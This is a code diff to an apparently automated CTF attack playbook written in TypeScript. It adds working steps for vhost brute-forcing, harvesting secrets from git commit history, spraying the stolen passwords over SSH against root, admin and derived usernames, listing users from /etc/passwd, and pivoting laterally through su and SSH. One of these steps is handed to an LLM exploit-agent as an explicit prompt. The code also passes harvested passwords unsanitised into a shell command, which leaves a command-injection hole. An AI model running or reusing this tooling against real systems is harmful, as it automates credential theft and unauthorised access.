@@ -78,6 +78,29 @@ const sslHostnames: Action = {
   },
 };
 
+const resolveHostname: Action = {
+  name: "resolve_hostname",
+  description: "Inject discovered hostname into attackbox /etc/hosts so subsequent actions can reach vhosts",
+  on: (e) => e.type === "HostnameFound" && !!e.payload.hostname,
+  async run(ctx) {
+    const hostname = ctx.event.payload.hostname as string;
+    const target = ctx.target;
+    // Validate hostname before injecting
+    if (!/^[a-zA-Z0-9.-]+$/.test(hostname)) {
+      ctx.log(`[resolve_hostname] skipping unsafe hostname: ${hostname}`);
+      return;
+    }
+    // Check if already resolved (idempotent)
+    const check = await ctx.exec("sh", ["-c", `grep -qF '${hostname}' /etc/hosts && echo exists || echo missing`]);
+    if (check.stdout.trim() === "exists") {
+      ctx.log(`[resolve_hostname] ${hostname} already in /etc/hosts`);
+      return;
+    }
+    await ctx.exec("sh", ["-c", `echo '${target} ${hostname}' >> /etc/hosts`]);
+    ctx.log(`[resolve_hostname] added ${hostname} -> ${target}`);
+  },
+};
+
 const dirBrute: Action = {
   name: "dir_brute",
   description: "Directory and file discovery on web services",
@@ -143,23 +166,151 @@ const dirBruteVhost: Action = {
 const vhostBrute: Action = {
   name: "vhost_brute",
   description: "Virtual host discovery",
-  on: (e) => e.type === "HostnameFound",
+  on: (e) => e.type === "HostnameFound" && e.payload.source !== "ffuf_vhost",
   emits: ["HostnameFound"],
   async run(ctx) {
     const hostname = ctx.event.payload.hostname as string;
     const domain = hostname.split(".").slice(-2).join(".");
+    const outFile = `/tmp/ffuf-vhosts-${domain}-${Date.now()}.json`;
     const result = await ctx.exec("ffuf", [
       "-u", `http://${ctx.target}/`, "-H", `Host: FUZZ.${domain}`,
       "-w", "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
       "-mc", "all", "-fc", "301", "-fs", "0", "-t", "50",
+      "-o", outFile, "-of", "json",
     ]);
-    if (!result.stdout.includes("| URL |")) {
-      await ctx.discover("negative", "vhost", `No vhosts found for ${domain}`);
+    try {
+      const content = await ctx.readFile(outFile);
+      const data = JSON.parse(content) as { results?: Array<{ input: { FUZZ: string }; status: number; length: number }> };
+      const found = data.results ?? [];
+      if (found.length === 0) {
+        await ctx.discover("negative", "vhost", `No vhosts found for ${domain}`);
+        return;
+      }
+      for (const r of found) {
+        const vhost = `${r.input.FUZZ}.${domain}`;
+        await ctx.emit("HostnameFound", { hostname: vhost, source: "ffuf_vhost", port: 80 });
+        await ctx.discover("positive", "vhost", `Discovered vhost: ${vhost} (status ${r.status}, size ${r.length})`);
+      }
+    } catch {
+      if (!result.stdout.includes("| URL |")) {
+        await ctx.discover("negative", "vhost", `No vhosts found for ${domain}`);
+      }
     }
   },
 };
 
 /** @module Enumeration */
+
+const gitSecretScan: Action = {
+  name: "git_secret_scan",
+  description: "Clone public git repos and search commit history for leaked secrets",
+  on: (e) => {
+    if (e.type !== "HostnameFound" || !e.payload.hostname) return false;
+    const hostname = (e.payload.hostname as string).toLowerCase();
+    return /^(git\.|gitlab\.|gitea\.|gogs\.|forgejo\.)/.test(hostname) ||
+      hostname.includes("git") || e.payload.source === "ffuf_vhost";
+  },
+  emits: ["CredentialFound"],
+  async run(ctx) {
+    const hostname = ctx.event.payload.hostname as string;
+    const giteaBase = `http://${hostname}`;
+    const dir = `/tmp/git-scan-${Date.now()}`;
+
+    // Try Gitea API for public repos
+    const apiResult = await ctx.exec("curl", ["-sf", `${giteaBase}/api/v1/repos/search?limit=20`]);
+    if (apiResult.code !== 0) return;
+
+    let repos: Array<{ clone_url: string; full_name: string }> = [];
+    try {
+      const data = JSON.parse(apiResult.stdout);
+      repos = (data.data ?? data) as typeof repos;
+    } catch { return; }
+
+    if (repos.length === 0) {
+      await ctx.discover("negative", "git", `No public repos on ${hostname}`);
+      return;
+    }
+
+    await ctx.exec("mkdir", ["-p", dir]);
+
+    for (const repo of repos.slice(0, 5)) {
+      const repoDir = `${dir}/${repo.full_name.replace("/", "_")}`;
+      const clone = await ctx.exec("git", ["clone", "--quiet", repo.clone_url, repoDir]);
+      if (clone.code !== 0) continue;
+
+      // Search all commit diffs for secrets
+      const log = await ctx.exec("git", [
+        "-C", repoDir, "log", "--all", "-p", "--diff-filter=A",
+        "-S", "password", "--", "*.env", "*.conf", "*.yml", "*.yaml", "*.json", "*.php", "*.py",
+      ]);
+
+      const secretPatterns = /(?:password|secret|token|api_key|db_pass)\s*[=:]\s*['"]?([^\s'"}{]+)/gi;
+      const matches = log.stdout.matchAll(secretPatterns);
+      const seen = new Set<string>();
+
+      for (const m of matches) {
+        const value = m[1];
+        if (value.length < 4 || value.startsWith("${") || value === "null" || value === "your_") continue;
+        const key = `${m[0]}`;
+        if (seen.has(key)) continue;
+        seen.add(key);
+        await ctx.emit("CredentialFound", {
+          source: `git history: ${repo.full_name}`,
+          credential: m[0],
+          value,
+        });
+        await ctx.discover("positive", "git", `Secret in git history of ${repo.full_name}: ${m[0].slice(0, 60)}`);
+      }
+
+      if (seen.size === 0) {
+        await ctx.discover("negative", "git", `No secrets in git history of ${repo.full_name}`);
+      }
+    }
+  },
+};
+
+const credentialTest: Action = {
+  name: "credential_test",
+  description: "Try discovered credentials against SSH",
+  on: (e) => e.type === "CredentialFound" && !!(e.payload.value ?? e.payload.password),
+  emits: ["ShellObtained"],
+  async run(ctx) {
+    const { source } = ctx.event.payload;
+    const password = (ctx.event.payload.value ?? ctx.event.payload.password) as string;
+
+    // Build username candidates
+    const usernames: string[] = [];
+
+    // From explicit username in payload
+    if (ctx.event.payload.username) usernames.push(ctx.event.payload.username as string);
+
+    // From email in source context
+    const emailMatch = (source as string)?.match(/([a-zA-Z0-9._-]+)@/);
+    if (emailMatch) usernames.push(emailMatch[1]);
+
+    // From credential string (user:pass or user=pass patterns)
+    const credStr = (ctx.event.payload.credential ?? "") as string;
+    const userPassMatch = credStr.match(/^([a-zA-Z0-9._-]+)[=:]/);
+    if (userPassMatch) usernames.push(userPassMatch[1]);
+
+    // Common service accounts
+    usernames.push("admin", "root");
+
+    for (const user of [...new Set(usernames)]) {
+      const ssh = await ctx.exec("sshpass", ["-p", password, "ssh",
+        "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
+        "-o", "PasswordAuthentication=yes",
+        `${user}@${ctx.target}`, "id",
+      ]);
+      if (ssh.code === 0 && ssh.stdout.includes("uid=")) {
+        await ctx.emit("ShellObtained", { user, method: "ssh", password, context: ssh.stdout.trim() });
+        await ctx.discover("positive", "cred", `SSH login succeeded: ${user} (password from ${source})`);
+        return;
+      }
+    }
+    await ctx.discover("negative", "cred", `No SSH login with password from ${source}`);
+  },
+};
 
 const nucleiScan: Action = {
   name: "nuclei_scan",
@@ -420,31 +571,67 @@ const flagCapture: Action = {
 const lateralMovement: Action = {
   name: "lateral_move",
   description: "Lateral movement: use discovered credentials to pivot to other users",
-  on: (e) => e.type === "CredentialFound" && e.payload.username != null && e.payload.password != null,
+  on: (e) => e.type === "CredentialFound" && (e.payload.password ?? e.payload.value) != null,
   emits: ["ShellObtained"],
   async run(ctx) {
-    const { username, password } = ctx.event.payload;
+    const password = (ctx.event.payload.password ?? ctx.event.payload.value) as string;
+    const username = ctx.event.payload.username as string | undefined;
+
+    // If no username provided, try to extract from source or discover from target
+    const usernames: string[] = username ? [username] : [];
+    if (usernames.length === 0) {
+      const source = (ctx.event.payload.source ?? "") as string;
+      const emailMatch = source.match(/([a-zA-Z0-9._-]+)@/);
+      if (emailMatch) usernames.push(emailMatch[1]);
+      // Try passwd via SSH or existing shell
+      const passwd = await ctx.exec("cat", ["/etc/passwd"]);
+      if (passwd.code === 0) {
+        for (const line of passwd.stdout.split("\n")) {
+          if (line.includes("/bin/bash") || line.includes("/bin/zsh") || line.includes("/bin/sh")) {
+            const u = line.split(":")[0];
+            if (u && !["root", "daemon", "bin", "sys", "sync", "www-data", "nobody"].includes(u)) {
+              usernames.push(u);
+            }
+          }
+        }
+      }
+    }
+
     await enumerateContext(ctx);
     await identifyBoundary(ctx);
-    const su = await ctx.exec("sh", ["-c", `echo '${password}' | su -s /bin/bash ${username} -c id`]);
-    if (su.code === 0 && su.stdout.includes("uid=")) {
-      await ctx.emit("ShellObtained", { user: username, method: "su", context: su.stdout.trim() });
-      await ctx.discover("positive", "lateral", `Pivoted to ${username} via su`);
-    }
-    const ssh = await ctx.exec("sshpass", ["-p", password as string, "ssh", "-o", "StrictHostKeyChecking=no", `${username}@${ctx.target}`, "id"]);
-    if (ssh.code === 0 && ssh.stdout.includes("uid=")) {
-      await ctx.emit("ShellObtained", { user: username, method: "ssh", context: ssh.stdout.trim() });
-      await ctx.discover("positive", "lateral", `Pivoted to ${username} via SSH`);
+    for (const user of [...new Set(usernames)]) {
+      const su = await ctx.exec("sh", ["-c", `echo '${password}' | su -s /bin/bash ${user} -c id`]);
+      if (su.code === 0 && su.stdout.includes("uid=")) {
+        await ctx.emit("ShellObtained", { user, method: "su", context: su.stdout.trim() });
+        await ctx.discover("positive", "lateral", `Pivoted to ${user} via su`);
+        return;
+      }
+      const ssh = await ctx.exec("sshpass", ["-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5", `${user}@${ctx.target}`, "id"]);
+      if (ssh.code === 0 && ssh.stdout.includes("uid=")) {
+        await ctx.emit("ShellObtained", { user, method: "ssh", context: ssh.stdout.trim() });
+        await ctx.discover("positive", "lateral", `Pivoted to ${user} via SSH`);
+        return;
+      }
     }
   },
-  prompt: "Use the discovered credentials ({username}:{password}) to move laterally. Try su, SSH, and any service-specific auth. Once you have a new shell, enumerate the new user's context for further escalation paths.",
+  prompt: "Use the discovered credentials to move laterally. Password: {value}. Source: {source}. Try su, SSH, and any service-specific auth.",
   llm: { agent: "exploit-agent", session: "fresh" },
 };
+
+const SKIP_EXPLOIT_PRODUCTS = new Set([
+  "openssh", "nginx", "apache", "openssl", "linux_kernel", "sudo",
+]);
 
 const exploitAvailable: Action = {
   name: "exploit_from_cve",
   description: "Auto-create a finding when a CVE match is found in the exploit index",
-  on: (e) => e.type === "ExploitAvailable",
+  on: (e) => {
+    if (e.type !== "ExploitAvailable") return false;
+    const product = ((e.payload.product as string) ?? "").toLowerCase().replace(/[^a-z0-9]/g, "_");
+    if (SKIP_EXPLOIT_PRODUCTS.has(product)) return false;
+    const score = (e.payload.cvss as number) ?? 0;
+    return score >= 7.0;
+  },
   emits: ["FindingAdded"],
   async run(ctx) {
     const { cve, product, cvss, pocPath } = ctx.event.payload;
@@ -478,11 +665,13 @@ export const CTF_PLAYBOOK: Playbook = {
   description: "Reactive CTF playbook: scan, enumerate per service, exploit, escalate, capture flags.",
   actions: [
     // Recon
-    portScan, udpScan, webRecon, sslHostnames, dirBrute, dirBruteVhost, vhostBrute,
+    portScan, udpScan, webRecon, sslHostnames, resolveHostname, dirBrute, dirBruteVhost, vhostBrute,
     // Enumeration
-    nucleiScan, smbEnum, ftpEnum, snmpEnum, nfsEnum, imapEnum,
+    gitSecretScan, nucleiScan, smbEnum, ftpEnum, snmpEnum, nfsEnum, imapEnum,
     cveSearch, sourceCodeAnalysis, defaultCreds,
     webVulnTests, pathTraversalAction,
+    // Credential testing
+    credentialTest,
     // Exploitation
     exploitAvailable, exploit,
     // Post-exploitation
